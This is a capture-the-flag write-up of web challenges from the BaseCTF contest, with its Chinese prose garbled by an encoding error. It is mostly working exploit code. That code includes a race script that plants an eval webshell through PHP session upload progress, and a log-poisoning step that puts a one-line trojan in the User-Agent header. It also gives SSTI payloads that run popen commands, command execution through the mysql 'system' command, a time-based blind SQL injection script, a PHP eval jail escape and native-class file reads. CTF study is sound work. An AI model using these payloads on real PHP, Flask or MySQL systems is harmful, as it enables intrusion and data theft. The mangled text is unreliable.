é¢˜ç›®æè¿°ï¼š`æ¯ä¸€é“é¢˜ç›®éœ€è¦åœ¨ 5 ç§’å†…è§£å‡º, ä¼ å…¥åˆ° $_POST['answer'] ä¸­, è§£å‡º 50 é“å³å¯, é™¤æ³•å–æ•´`  
æç¤ºï¼š`æœ¬é¢˜ä¾èµ– sessionï¼Œè¯·åœ¨è¯·æ±‚æ—¶å¼€å¯ session cookie`

æ‰“å¼€é¡µé¢çœ‹åˆ°ï¼š`Your score is reset to 0Tell me in 3 second 7383295-7009224?`

å…³é”®ç‚¹ï¼š3ç§’ï¼Œåˆ†æ•°ï¼Œ50æ¬¡ä¸¤ä¸ªæ•°çš„è¿ç®—ã€‚äººå·¥æ‰‹åŠ¨æŒ‡å®šæ˜¯ä¸å¯èƒ½çš„

```python
import re
import requests

url = 'http://challenge.basectf.fun:38937/'
# åˆ›å»ºä¼šè¯
session = requests.Session()

num_pattern = r"\d{2,}"
str_pattern = r"[\+\-\Ã—\Ã·]"
text = (session.get(url)).text
while True:
	num_matches = re.findall(num_pattern,text)
	str_matches = re.findall(str_pattern,text)
	num1 = int(num_matches[0])
	num2 = int(num_matches[1])
	res = 0
	if str_matches[0] == '+':
		res = num1 + num2
	elif str_matches[0] == '-':
		res = num1 - num2
	elif str_matches[0] == 'Ã—':
		res = num1 * num2
	elif str_matches[0] == 'Ã·':
		res = num1 // num2
	data = {
	"answer": str(res),
	}
	print(data)
	resp = session.post(url,data=data)
	text = resp.text
	print(text)
	if "now 50" in text:
		print("successful!")
		break
```

![10](/medias/basectf/10.png)

è„šæœ¬è·‘çš„æ…¢ï¼ŸæŠŠé­”æ³•å…³äº†ï¼Œå¥æ­¥å¦‚é£

## [Week3] æ»¤ä¸ªä¸åœ

è€ƒç‚¹ï¼š`æ–‡ä»¶åŒ…å«ï¼ŒsessionåŒ…å«`

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

$incompetent = $_POST['incompetent'];
$Datch = $_POST['Datch'];

if ($incompetent !== 'HelloWorld') {
    die('å†™å‡ºç¨‹åºå‘˜çš„ç¬¬ä¸€è¡Œé—®å€™å§ï¼');
}

//è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œä¸œï¼Ÿï¼Ÿï¼Ÿ
$required_chars = ['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o'];
$is_valid = true;

foreach ($required_chars as $char) {
    if (strpos($Datch, $char) === false) {
        $is_valid = false;
        break;
    }
}

if ($is_valid) {

    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://'];

    foreach ($invalid_patterns as $pattern) {
        if (stripos($Datch, $pattern) !== false) {
            die('æ­¤è·¯ä¸é€šæ¢æ¡è·¯è¯•è¯•?');
        }
    }


    include($Datch);
} else {
    die('æ–‡ä»¶åä¸åˆè§„ è¯·é‡è¯•');
}
?>
```

å¾ˆæ˜æ˜¾ï¼Œä¸€é“æ–‡ä»¶åŒ…å«é¢˜ç›®ã€‚

```php
$required_chars = ['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o'];
```

~è¿™é‡Œè¦æ±‚æ–‡ä»¶åè¦æœ‰sevanxroï¼Œæ‰€ä»¥è·Ÿæ—¥å¿—åŒ…å«æ²¡å…³ç³»äº†~ï¼Œçœ‹äº†å®˜æ–¹wpæ—¶ï¼Œå‘ç°æˆ‘æœ€åˆæƒ³é”™äº†ï¼Œæˆ‘ä»¥ä¸ºè¦æ•´ä¸ªsevanxroå­—ç¬¦ä¸²è¦åœ¨å˜é‡å€¼é‡Œå‡ºç°ï¼Œç°åœ¨å‘ç°åªè¦è¿™äº›å­—æ¯å‡ºç°å³å¯ï¼Œæ‰€ä»¥æ—¥å¿—åŒ…å«ä¹Ÿæ˜¯å¯ä»¥çš„`/var/log/nginx/access.log`

æ‰€ä»¥`POSTï¼šincompetent=HelloWorld&Datch=/var/log/nginx/access.log`ï¼Œåœ¨UA(user-agenté‡Œæ·»åŠ ä¸€å¥è¯æœ¨é©¬å³å¯)

```php
    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://'];
```

è¿™é‡Œç¦ç”¨äº†phpä¼ªåè®®ï¼Œæ‰€ä»¥ä¼ªåè®®ä¹Ÿä¸è¡Œäº†

è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼ŒsessionåŒ…å«ï¼Œé€šè¿‡ä¼ªé€ æ–‡ä»¶ä¸Šä¼ çš„è¿‡ç¨‹ï¼Œåœ¨æœåŠ¡å™¨åˆ›å»ºå«æœ‰æ¶æ„ä»£ç çš„sessionæ–‡ä»¶

æˆ‘çš„å¾€æœŸæ–‡ç« [ã€sessionåŒ…å«ã€‘](/pages/07a506/)

ç›´æ¥ä¸Šè„šæœ¬

```python
import requests
import threading
import time

# å¦‚æœé¢˜ç›®é“¾æ¥æ˜¯httpsï¼Œæ¢æˆhttp
url = 'http://challenge.basectf.fun:38890/'
sessionid = 'sevanxro'
data = {
    # sessionæ–‡ä»¶å†…å®¹
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php file_put_contents("shell.php","<?php highlight_file(__FILE__);eval(\$_GET[1]);?>");?>',
    # sessionæ–‡ä»¶è·¯å¾„å¯èƒ½ä¸åŒ
    'incompetent': 'HelloWorld',
    'Datch': '/tmp/sess_' + sessionid,
}

file = {
    'file': sessionid
}

cookies = {
    'PHPSESSID': sessionid
}

# ä¸Šä¼ æ–‡ä»¶å‡½æ•°
def upload_file():
    while True:
        response = requests.post(url, data=data, files=file, cookies=cookies)
        time.sleep(1)  # ä¸ºäº†é¿å…å‘é€è¯·æ±‚è¿‡å¿«ï¼Œå¯ä»¥é€‚å½“å¢åŠ é—´éš”æ—¶é—´

# æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å·²åˆ›å»º
def check_file():
    while True:
        r = requests.get(url + 'shell.php')
        if r.status_code == 200:
            print('Webshell created successfully')
            print(r.text)
            break
        else:
            print('errorï¼š', r.status_code)
        # time.sleep(1)  # ä¸ºäº†é¿å…å‘é€è¯·æ±‚è¿‡å¿«ï¼Œå¯ä»¥é€‚å½“å¢åŠ é—´éš”æ—¶é—´

# åˆ›å»ºå¹¶å¯åŠ¨çº¿ç¨‹
threads = []
for _ in range(5):  # åˆ›å»º5ä¸ªä¸Šä¼ çº¿ç¨‹
    t = threading.Thread(target=upload_file)
    t.start()
    threads.append(t)

for _ in range(5):  # åˆ›å»º5ä¸ªæ£€æŸ¥çº¿ç¨‹
    t = threading.Thread(target=check_file)
    t.start()
    threads.append(t)

# ç­‰å¾…æ‰€æœ‰çº¿ç¨‹å®Œæˆ
for t in threads:
    t.join()
```

å¾ˆå®¹æ˜“è·‘å‡ºæ¥shellï¼Œå¦‚æœå¾ˆæ…¢ï¼Œå…ˆæ£€æŸ¥è„šæœ¬å‚æ•°æ˜¯å¦æ­£ç¡®ï¼Œä¸è¡Œå†è¯•è¯•å…³æ‰é­”æ³•æˆ–è€…é‡å¯å®¹å™¨å§


## [Week3] å¤è¯»æœº ã€å¤ç°ã€‘

è€ƒç‚¹ï¼š`SSTI`

::: v-pre
æ‰“å¼€é¢˜ç›®ï¼Œé™åˆ¶äº†æ¨¡æ¿`BaseCTF{}`ï¼Œé€šè¿‡æµ‹è¯•å¯ä»¥å‘ç°banäº†ä¸€äº›ç¬¦åˆä¾‹å¦‚`""  __  . {{}}  +  - /`ç­‰ç­‰å­—ç¬¦ï¼Œä»¥åŠSSTIå¸¸ç”¨çš„å­—ç¬¦ä¸²ä¾‹å¦‚`class,base,subclass,init,globals,popen,read,ss`ç­‰ç­‰
:::

æ¢³ç†ï¼š  
::: v-pre
- ç¦ç”¨åŒèŠ±æ‹¬å·å¯ä»¥ä½¿ç”¨`{%%}`æ›¿æ¢
- ç¦ç”¨åŒä¸‹åˆ’çº¿ä»¥åŠå¸¸è§å­—ç¬¦ä¸²`__`è¿˜å¯ä»¥ä½¿ç”¨å•å¼•å·`''`æ‹¼æ¥å®ç°
- ç¦ç”¨ç‚¹`.`å¯ä»¥ä½¿ç”¨æ–¹æ‹¬å·`[]`å®ç°
:::

éš¾ç‚¹ï¼š  
è·å–`/`

::: v-pre
æŠŠå¸¸ç”¨çš„payload`{{().__class__.__base__.__subclasses__()}}`ä¸€ç‚¹ç‚¹æ›¿æ¢åˆ°å¯ä»¥ç»•è¿‡é¢˜ç›®çš„payload
:::

æ„é€ `class`ï¼š

::: v-pre
BaseCTF{%set chr=''['_''_clas''s''_''_']%}{%print(chr)%}
:::

åŒç†æ„é€ `base,subclasses`ï¼ŒæŠ¥é”™å°±æ¢ä¸ªä½ç½®æ‹¼æ¥ï¼š

::: v-pre
BaseCTF{%set chr=''['_''_clas''s''_''_']['_''_bas''e_''_']%}{%print(chr)%}  
BaseCTF{%set chr=''['_''_clas''s''_''_']['_''_bas''e_''_']['_''_sub''c''l''a''s''s''e''s_''_']()%}{%print(chr)%}  
:::

::: v-pre
æ‰¾åˆ°`<class 'os._wrap_close'>`çš„ä¸‹æ ‡137ï¼Œä½¿ç”¨å®ƒçš„`init,globals`ä¸‹çš„popenå‡½æ•°ï¼Œreadç»“æœè¯»å‡ºæ¥
:::

æ‰§è¡Œ`ls /`å¤±è´¥ï¼Œ`/`è¢«è¿‡æ»¤

::: v-pre
BaseCTF{%set chr=''['_''_clas''s''_''_']['_''_bas''e_''_']['_''_sub''c''l''a''s''s''e''s_''_']()[137]['_''_in''it_''_']['_''_glob''als_''_']['po''pen']('ls /')['re''ad']()%}{%print(chr)%}
:::

å‡‘`/`ï¼š

æŸ¥çœ‹ç¯å¢ƒå˜é‡`env`

::: v-pre
BaseCTF{%set chr=''['_''_clas''s''_''_']['_''_bas''e_''_']['_''_sub''c''l''a''s''s''e''s_''_']()[137]['_''_in''it_''_']['_''_glob''als_''_']['po''pen']('env')['re''ad']()%}{%print(chr)%}
:::

çœ‹åˆ°ç¯å¢ƒå˜é‡`OLDPWD=/`

æœ€ç»ˆpayloadå¯ä»¥è¿™æ ·æ„é€ ï¼š

::: v-pre
BaseCTF{%set chr=''['_''_clas''s''_''_']['_''_bas''e_''_']['_''_sub''c''l''a''s''s''e''s_''_']()[137]['_''_in''it_''_']['_''_glob''als_''_']['po''pen']('cd $OLDPWD;ls;cat flag')['re''ad']()%}{%print(chr)%}
:::

## [Week3] ç©åŸç¥ç©çš„ ã€å¤ç°ã€‘

è€ƒç‚¹ï¼š`?è„šæœ¬ç¼–å†™ï¼ŒæŠ¥æ–‡ä¸­%ç™¾åˆ†å·å¤„ç†ï¼Œ?å¯†ç å­¦`

æºç :

::: details
```php
<?php
highlight_file(__FILE__);
error_reporting(0);

include 'flag.php';
if (sizeof($_POST['len']) == sizeof($array)) {
  ys_open($_GET['tip']);
} else {
  die("é”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒ");
}

function ys_open($tip) {
  if ($tip != "æˆ‘è¦ç©åŸç¥") {
    die("æˆ‘ä¸ç®¡ï¼Œæˆ‘è¦ç©åŸç¥ï¼ğŸ˜­ğŸ˜­ğŸ˜­");
  }
  dumpFlag();
}

function dumpFlag() {
  if (!isset($_POST['m']) || sizeof($_POST['m']) != 2) {
    die("å¯æ¶çš„QQäººï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡");
  }
  $a = $_POST['m'][0];
  $b = $_POST['m'][1];
  if(empty($a) || empty($b) || $a != "100%" || $b != "love100%" . md5($a)) {
    die("æŸç«™å´©äº†ï¼Ÿè‚¯å®šæ˜¯æŸå¿½æ‚ å¹²çš„ï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡");
  }
  include 'flag.php';
  $flag[] = array();
  for ($ii = 0;$ii < sizeof($array);$ii++) {
    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);
  }
  
  echo json_encode($flag);
}
```
:::

åˆšå¼€å§‹è‡ªå·±åšçš„æ—¶å€™å†™è„šæœ¬è·‘æ•°ç»„å¤§å°ï¼Œåˆšå¼€å§‹æˆ‘çš„çˆ†ç ´è„šæœ¬
::: details
```python
import requests
import re

url = 'http://challenge.basectf.fun:20714/'
data = "len[0]=0"
for i in range(1,100):
    data = data + f"&len[{i}]={i}"
    resp = requests.post(url,data)
    print(data)
    # print(resp.text)
    pattern = r"æˆ‘ä¸ç®¡ï¼Œæˆ‘è¦ç©åŸç¥"
    matches = re.findall(pattern,resp.text)
    print(len(matches))
    if len(matches) > 2:
        print(f"æ‰¾åˆ°å•¦ï¼ï¼ï¼\næ•°ç»„é•¿åº¦æ˜¯ï¼š{i}")
        break
```
:::

è·‘çš„æ€€ç–‘äººç”Ÿã€‚ç°åœ¨å¤ç°æ—¶å‘ç°æˆ‘æ˜¯`sb`ï¼Œè¿™ä¸ªè„šæœ¬é‡Œå‘åŒ…çš„dataæ•°æ®æ˜¯é•¿åº¦ä¸º1çš„å­—å…¸ã€‚çˆ†ç ´é¢˜ç›®çš„æ•°ç»„å¤§å°éœ€è¦ä¼ å­—å…¸æ•°æ®ï¼Œè¿™æ˜¯æ”¹è¿›è„šæœ¬

::: details
```python
import requests
import re

url = 'http://challenge.basectf.fun:20714/'
data = {}
for i in range(1,100):
    # æ·»åŠ å­—å…¸æ•°æ®é•¿åº¦
    data[f"len[{i}]"] = f"{i}"
    resp = requests.post(url,data)
    pattern = r"æˆ‘ä¸ç®¡ï¼Œæˆ‘è¦ç©åŸç¥"
    matches = re.findall(pattern,resp.text)
    print(len(matches))
    if len(matches) == 2:
        print(f"æ‰¾åˆ°å•¦ï¼ï¼ï¼\næ•°ç»„é•¿åº¦æ˜¯ï¼š{i}")
        print(data)
        data = "len[0]=0"
        for j in range(1,i):
            data = data + f"&len[{j}]={j}"
            resp = requests.post(url,data)
        print(f"æ„é€ çš„lenï¼š  {data}")
        break
```
:::

å¯ä»¥è·‘å‡ºæ¥ï¼Œæ•°ç»„å¤§å°ä¸º`45`ï¼Œæ‹¿è„šæœ¬æ„é€ çš„payloadç›´æ¥ä¼ å‚ã€‚tipæ­£å¸¸ä¼ ã€‚åé¢`a=100%`,`b=100%+md5($a)`ï¼Œæ³¨æ„bï¼Œä¹Ÿå°±æ˜¯m[1]ï¼Œé‡Œé¢çš„%ç™¾åˆ†å·éœ€è¦è½¬ä¹‰ï¼Œåœ¨ç™¾åˆ†å·åå†æ·»åŠ `25`ï¼Œä¸ç„¶`%`ç™¾åˆ†å·ä¼šå’Œåé¢æ•°å­—ä½œä¸ºurlç¼–ç ï¼Œå‘åŒ…åå¯ä»¥æ‹¿åˆ°æ¯ä¸€ä½flagå’Œä¸‹æ ‡çš„å¼‚æˆ–md5å€¼

è¿˜åŸflagè„šæœ¬

::: details
```python
import hashlib

hashes = [
    "3295c76acbf4caaed33c36b1b5fc2cb1", "26657d5ff9020d2abefe558796b99584", "73278a4a86960eeb576a8fd4c9ec6997",
    "ec8956637a99787bd197eacd77acce5e", "e2c420d928d4bf8ce0ff2ec19b371514", "43ec517d68b6edd3015b3edc9a11367b",
    "ea5d2f1c4608232e07d3aa3d998e5135", "c8ffe9a587b126f152ed3d89a146b445", "44f683a84163b3523afe57c2e008bc8c",
    "093f65e080a295f8076b1c5722a46aa2", "03afdbd66e7929b125f8597834fa83a4", "698d51a19d8a121ce581499d7b701668",
    "9f61408e3afb633e50cdf1b20de6f466", "9a1158154dfa42caddbd0694a4e9bdc8", "698d51a19d8a121ce581499d7b701668",
    "093f65e080a295f8076b1c5722a46aa2", "7f39f8317fbdb1988ef4c628eba02591", "c45147dee729311ef5b5c3003946c48f",
    "07e1cd7dca89a1678042477183b7ac3f", "5fd0b37cd7dbbb00f97ba6ce92bf5add", "5fd0b37cd7dbbb00f97ba6ce92bf5add",
    "9f61408e3afb633e50cdf1b20de6f466", "e369853df766fa44e1ed0ff613f563bd", "182be0c5cdcd5072bb1864cdee4d3d6e",
    "a0a080f42e6f13b3a2df133f073095dd", "a0a080f42e6f13b3a2df133f073095dd", "b53b3a3d6ab90ce0268229151c9bde11",
    "4c56ff4ce4aaf9573aa5dff913df997a", "f7177163c833dff4b38fc8d2872f1ec6", "f7177163c833dff4b38fc8d2872f1ec6",
    "f7177163c833dff4b38fc8d2872f1ec6", "c0c7c76d30bd3dcaefc96f40275bdc0a", "7cbbc409ec990f19c78c75bd1e06f215",
    "c74d97b01eae257e44aa9d5bade97baf", "c74d97b01eae257e44aa9d5bade97baf", "70efdf2ec9b086079795c442636b55fb",
    "3c59dc048e8850243be8079a5c74d079", "735b90b4568125ed6c3f678819b6e058", "70efdf2ec9b086079795c442636b55fb",
    "c74d97b01eae257e44aa9d5bade97baf", "c74d97b01eae257e44aa9d5bade97baf", "6ea9ab1baa0efb9e19094440c317e21b",
    "02e74f10e0327ad868d138f2b4fdd6f0", "35f4a8d465e6e1edc05f3d8ab658c551", "43ec517d68b6edd3015b3edc9a11367b"
]
flag = ''
for index, char in enumerate(hashes):
    for flag_char in range(0, 256):
        if (hashlib.md5(str(flag_char).encode("UTF-8")).hexdigest()) == char:
            # æ‹¿åˆ°ascll
            print(flag_char)
            part = flag_char ^ index
            flag = flag + chr(part)
            break
print(flag)
```
:::



## [Week3] ez_php_jail  ã€å¤ç°ã€‘

è€ƒç‚¹ï¼š`æ•æ„Ÿå‡½æ•°`

åæ‚”å½“æ—¶æ²¡çœ‹äº†ï¼Œå¥½åƒæŒºç®€å•çš„ã€‚é¢˜ç›®æºç 

::: details
```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("hint.html");
$Jail = $_GET['Jail_by.Happy'];

if($Jail == null) die("Do You Like My Jail?");

function Like_Jail($var) {
    if (preg_match('/(`|\$|a|c|s|require|include)/i', $var)) {
        return false;
    }
    return true;
}

if (Like_Jail($Jail)) {
    eval($Jail);
    echo "Yes! you escaped from the jail! LOL!";
} else {
    echo "You will Jail in your life!";
}
echo "\n";
```
:::

é¢˜ç›®GETæ¥æ”¶å‚æ•°`$Jail = $_GET['Jail_by.Happy'];`ï¼Œè¿™ä¸ªå‚æ•°åä¸­åŒæ—¶å«æœ‰`_``.`ä¸‹åˆ’çº¿å’Œç‚¹ï¼Œåœ¨phpä¸­ï¼Œè¿™ä¸¤ä¸ªåŒæ—¶å‡ºç°ï¼Œä¸”ä¸‹åˆ’çº¿åœ¨å‰çš„æ—¶å€™ï¼Œéœ€è¦æŠŠä¸‹åˆ’çº¿å†™æˆ`[`å·¦æ–¹æ‹¬å·ï¼Œä¸ç„¶åç«¯æ¥æ”¶ä¸åˆ°

åœ¨è¿™é¢˜çš„æºç é‡Œï¼Œæœ‰ä¸€ä¸ªbase64ï¼Œè§£ç æ˜¯ä¸€ä¸ªphpinfo()çš„é¡µé¢ï¼Œæ²¡ä»€ä¹ˆç”¨

åœ¨ä¸‹é¢çš„evalå‡½æ•°é‡Œï¼Œè¿‡æ»¤äº†åå¼•å·ï¼Œç¾å…ƒç¬¦ï¼Œa,c,sï¼Œrequire,includeã€‚å®˜æ–¹wpä½¿ç”¨highlight_fileå‡½æ•°å’Œglob()å‡½æ•°ï¼Œæ‰«æå¹¶é«˜äº®æ˜¾ç¤ºflag

::: tip å‡½æ•°ä½œç”¨
highlight_file  é«˜äº®æ˜¾ç¤ºæ–‡ä»¶å†…å®¹
glob  æ‰«æè·¯å¾„æ–‡ä»¶ï¼Œè¿”å›ä¸€ä¸ªæ•°ç»„
:::

`payloadï¼š?Jail[by.Happy=highlight_file(glob('/fl?g')[0])`

## [Week4] flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ

è€ƒç‚¹ï¼š`åŸç”Ÿç±»`

æºç 

```php
<?php
highlight_file('index.php');
# æˆ‘æŠŠflagè—åœ¨ä¸€ä¸ªsecretæ–‡ä»¶å¤¹é‡Œé¢äº†ï¼Œæ‰€ä»¥è¦å­¦ä¼šéå†å•Š~
error_reporting(0);
$J1ng = $_POST['J'];
$Hong = $_POST['H'];
$Keng = $_GET['K'];
$Wang = $_GET['W'];
$dir = new $Keng($Wang);
foreach($dir as $f) {
    echo($f . '<br>');
}
echo new $J1ng($Hong);
?>
```

ä¸¤å¤„å…³é”®ç‚¹ï¼š`$dir = new $Keng($Wang);`å’Œ`echo new $J1ng($Hong);`

åŸç”Ÿç±»ç¬¬ä¸€æ¬¡ä½¿ç”¨ï¼Œæ‰«ææ–‡ä»¶å¤¹å¹¶æ‰“å°
```php
foreach($dir as $f) {
    echo($f . '<br>');
}
```

`payloadï¼š?K=DirectoryIterator&W=/secret`

æ‹¿åˆ°flagæ–‡ä»¶å`f11444g.php`

åŸç”Ÿç±»ç¬¬äºŒæ¬¡ä½¿ç”¨ï¼Œè¯»å–æ–‡ä»¶å†…å®¹

`payloadï¼šJ=SplFileObject&H=php://filter/convert.base64-encode/resource=/secret/f11444g.php`

## [Fin] RCE or Sql inject ã€å¤ç°ã€‘

é¢˜ç›®æºç 

```php
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/se|ec|st|;|@|delete|into|outfile/i', $sql)) {
    die("ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰sqlæ³¨å…¥");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
    die("ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰RCE");
}
$query = "mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- " . $sql . "\"";
system($query); 
```

é¢˜ç›®æç¤ºï¼Œåœ¨mysqlé‡Œè¾“å…¥é—®å·ï¼Œä¼šæç¤ºå…³äºé¢˜ç›®çš„è§£æ³•ã€‚é¢˜ç›®çš„sqlè¯­å¥æœ€åæŠŠæ‹¼æ¥éƒ¨åˆ†æ³¨é‡Šäº†ï¼Œä½¿ç”¨æ¢è¡Œé€ƒé€¸å‡ºæ¥

![12](/medias/basectf/12.png)

mysqlæ‰§è¡Œ`?`çš„å›æ˜¾`system (\!) Execute a system shell command.`ï¼Œåœ¨mysqlé‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨systemæ‰§è¡Œç³»ç»Ÿå‘½ä»¤

é‚£è¿™é¢˜å°±å¯ä»¥ç›´æ¥`url?sql=%0asystem env`

![121](/medias/basectf/121.png)

## [Week4] åœ£é’¥ä¹‹æˆ˜1.0  ã€å¤ç°ã€‘

åœ¨readè·¯ç”±ä¸‹æºç 
```python
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/', methods=['GET', 'POST'])
def hello_world():
    return open('/static/index.html', encoding="utf-8").read()

@app.route('/read', methods=['GET', 'POST'])
def Read():
    file = open(__file__, encoding="utf-8").read()
    return f"J1ngHongè¯´ï¼šä½ æƒ³read flagå—ï¼Ÿ
é‚£ä¹ˆåœ£é’¥ä¹‹å…‰å¿…å°†é˜»æ­¢ä½ ï¼
ä½†æ˜¯å°å°çš„æºç æ²¡äº‹ï¼Œå› ä¸ºä½ ä¹Ÿè¯»ä¸åˆ°flag(ä¹)
{file}
"

@app.route('/pollute', methods=['GET', 'POST'])
def Pollution():
    if request.is_json:
        merge(json.loads(request.data),instance)
    else:
        return "J1ngHongè¯´ï¼šé’¥åŒ™åœ£æ´æ— æš‡ï¼Œæ— äººå¯ä»¥æ±¡æŸ“ï¼"
    return "J1ngHongè¯´ï¼šåœ£é’¥æš—æ·¡äº†ä¸€ç‚¹ï¼Œä½ å±…ç„¶æ±¡æŸ“æˆåŠŸäº†ï¼Ÿ"

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80)
```

å…ˆé—®é—®chatGPTæ€ä¹ˆçœ‹

::: tip åŸå‹æ±¡æŸ“
Prototype Pollutionï¼ˆåŸå‹æ±¡æŸ“ï¼‰æ¼æ´ï¼Œä¸»è¦å‡ºç°åœ¨å¯¹è±¡ç»§æ‰¿çš„è¯­è¨€ï¼ˆå¦‚ JavaScript å’Œ Pythonï¼‰ä¸­ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ä¿®æ”¹å¯¹è±¡çš„åŸå‹æˆ–ç±»å±æ€§æ¥æ±¡æŸ“å¯¹è±¡å®ä¾‹ï¼Œå¯¼è‡´æ„å¤–çš„è¡Œä¸ºã€‚
:::

åœ¨`/pollute`è·¯ç”±ä¸‹ï¼Œæ¥æ”¶GET/POSTå‚æ•°ï¼Œä½¿ç”¨`merge`å‡½æ•°å¤„ç†ï¼ŒæŠŠå‚æ•°å®ä¾‹åŒ–èµ‹å€¼ç»™instanceå¯¹è±¡

å†çœ‹instanceæ˜¯ä»€ä¹ˆç±»å®ä¾‹åŒ–çš„ï¼Œä¸€ä¸ªç©ºç±»

```python
class cls():
    def __init__(self):
        pass

instance = cls()
```

åœ¨read()å‡½æ•°é‡Œï¼Œä¼šè¯»å–`__file__`å˜é‡ï¼Œè¿™ä¸ªå˜é‡ä»£è¡¨å½“å‰çš„æ–‡ä»¶çš„è·¯å¾„ã€‚`å¦‚æœä¼ å…¥çš„å‚æ•°æ•°æ®ä¸­æœ‰æ–°çš„å±æ€§ï¼Œä¸”ç±»å‹åŒ¹é…ï¼Œå°±å¯ä»¥å‘ instance å¯¹è±¡æ³¨å…¥æ–°çš„å±æ€§æˆ–ä¿®æ”¹ç°æœ‰å±æ€§`ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡åŸå‹æ±¡æŸ“ï¼ŒæŠŠ`__file__`å˜é‡ä¼ªé€ æˆ`/flag`ï¼Œè¿™æ ·å°±å¯ä»¥è¯»åˆ°flagã€‚

## [week4] only one sql

æºç 

```php
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/select|;|@|\n/i', $sql)) {
    die("ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰sqlæ³¨å…¥");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
    die("ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰RCE");
}
//flag in ctf.flag
$query = "mysql -u root -p123456 -e \"use ctf;select 'æ²¡æœ‰selectï¼Œè®©ä½ æ‰§è¡Œä¸€å¥åˆå¦‚ä½•';" . $sql . "\"";
system($query);
```

é€šè¿‡`show tables`,`show columns from flag`ï¼Œæ‹¿åˆ°è¡¨åå’Œå­—æ®µå`id`,`data`ï¼Œæƒ³ç€æ²¡æœ‰selectæŸ¥ä¸äº†äº†ï¼Œèƒ½åŠ›æœ‰é™äº†

çœ‹äº†å¸ˆå‚…ä»¬è§£é¢˜æ€è·¯ï¼Œçœ¼å‰ä¸€äº®ã€‚çŒœæµ‹flagåœ¨dataå­—æ®µé‡Œï¼Œä½¿ç”¨`delete from flag where data like'f%' and sleep(3)`ï¼Œè¿™é‡Œéå¸¸ç»†èŠ‚ï¼Œè¿˜ç”¨åˆ°äº†andçš„æ€§è´¨ï¼Œå‰å‡ä¼šç›´æ¥ç»“æŸï¼Œä¸ä¼šæ‰§è¡Œåé¢çš„sleepå‡½æ•°ï¼Œåªæœ‰æ­£åˆ™åŒ¹é…åˆ°flagæ—¶ï¼Œæ‰ä¼šæ‰§è¡Œsleepå‡½æ•°ï¼Œä»è€Œç›²æ³¨å‡ºflagï¼Œsleepå‡½æ•°è¿”å›`null`ï¼Œæ•´ä¸ªæ¡ä»¶æ˜¯æ°¸å‡ï¼Œä¸ä¼šä¿®æ”¹flagã€‚

```python
import requests
import string
import time
import urllib.parse

# æµ‹è¯•ï¼Œæ²¡æœ‰å¤§å†™
sqlstr = '-{}abcdefghijklmnopqrstuvwxyz123456789'
url = "http://gz.imxbt.cn:20378/"
flag=''
for i in range(1,100):
    for c in sqlstr:
        params = {
        'sql': f"delete from flag where data like'{flag}{c}%' and sleep(3)",
        }
        # print(params)
        start_time = time.time()
        r = requests.get(url,params=params)

        end_time = time.time()
        # print(end_time-start_time)
        if (end_time-start_time) > 2:
            # print(c)
            flag = flag + c
            print(flag)
            break
```


## [Fin] 1z_php

è€ƒç‚¹ï¼š`phpç‰¹æ€§ è´ªå©ªåŒ¹é…ç»•è¿‡ åŸç”Ÿç±»è¯»å–æ–‡ä»¶`

æºç 

::: details
```php
<?php
highlight_file('index.php');
# æˆ‘è®°å¾—å¥¹...å¥½åƒå«flag.phpå§ï¼Ÿ
$emp=$_GET['e_m.p'];
$try=$_POST['try'];
if($emp!="114514"&&intval($emp,0)===114514)
{
    for ($i=0;$i<strlen($emp);$i++){
        if (ctype_alpha($emp[$i])){
            die("ä½ ä¸æ˜¯hackerï¼Ÿé‚£è¯·å»å¤–åœºç­‰å€™ï¼");
        }
    }
    echo "åªæœ‰çœŸæ­£çš„hackeræ‰èƒ½æ‹¿åˆ°flagï¼"."<br>";

    if (preg_match('/.+?HACKER/is',$try)){
        die("ä½ æ˜¯hackerè¿˜æ•¢è‡ªæŠ¥å®¶é—¨å‘¢ï¼Ÿ");
    }
    if (!stripos($try,'HACKER') === TRUE){
        die("ä½ è¿è‡ªå·±æ˜¯hackeréƒ½ä¸æ‰¿è®¤ï¼Œè¿˜æƒ³è¦flagå‘¢ï¼Ÿ");
    }

    $a=$_GET['a'];
    $b=$_GET['b'];
    $c=$_GET['c'];
    if(stripos($b,'php')!==0){
        die("æ”¶æ‰‹å§hackerï¼Œä½ å¾—ä¸åˆ°flagçš„ï¼");
    }
    echo (new $a($b))->$c();
}
else
{
    die("114514åˆ°åº•æ˜¯å•¥æ„æ€å˜ï¼Ÿã€‚ï¼Ÿ");
}
